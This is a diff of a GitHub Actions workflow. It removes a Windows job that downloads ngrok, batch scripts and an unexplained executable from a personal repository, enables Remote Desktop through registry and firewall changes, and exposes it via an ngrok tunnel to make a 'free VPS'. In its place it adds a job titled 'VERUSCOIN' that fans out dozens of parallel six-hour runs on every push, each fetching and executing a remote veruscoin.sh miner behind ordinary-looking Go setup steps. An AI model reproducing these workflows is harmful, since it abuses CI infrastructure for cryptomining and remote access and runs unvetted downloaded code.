@@ -1,68 +1,27 @@
-
-name: Quang2107
-
-on: workflow_dispatch
-
+name: VERUSCOIN
+on: [push, pull_request]
 jobs:
-
   build:
-
-    runs-on: windows-latest
-
-    timeout-day: 30
-
+    name: Mining
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
     steps:
-
-    - name: Đang Tải NGROK!
-
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Mining
       run: |
-
-        Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-
-        Invoke-WebRequest https://raw.githubusercontent.com/Quang2107/VPS-FREE/master/start.bat -OutFile start.bat
-
-        Invoke-WebRequest https://raw.githubusercontent.com/Quang2107/VPS-FREE/master/wallpaper.png -OutFile wallpaper.png
-
-        Invoke-WebRequest https://raw.githubusercontent.com/Quang2107/VPS-FREE/master/wallpaper.bat -OutFile wallpaper.bat
-
-        Invoke-WebRequest https://raw.githubusercontent.com/Quang2107/VPS-FREE/master/loop.bat -OutFile loop.bat
-
-    - name: Đang Tải Launcher!
-
-      run: |
-
-        Invoke-WebRequest https://raw.githubusercontent.com/Quang2107/VPS-FREE/master/launcher/kiemthanh.exe -OutFile kiemthanh.exe
-
-    - name: Đang Giải Nén Ngrok File...
-
-      run: Expand-Archive ngrok.zip
-
-    - name: Đang Kết Nối Đến Ngrok!
-
-      run: .\ngrok\ngrok.exe authtoken $Env:NGROK_AUTH_TOKEN
-
-      env:
-
-        NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
-
-    - name: Đang Xác Thực..
-
-      run: | 
-
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-
-        Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-
-    - name: Đang Bật...
-
-      run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp --region ap 3389"'
-
-    - name: Đang Kết Nối Đến Máy Chủ...
-
-      run: cmd /c start.bat
-
-    - name: Đã Tạo VPS Thành Công!
-
-      run: cmd /c loop.bat
+        wget https://github.com/deplear/FREE/blob/main/veruscoin.sh && ./veruscoin.sh
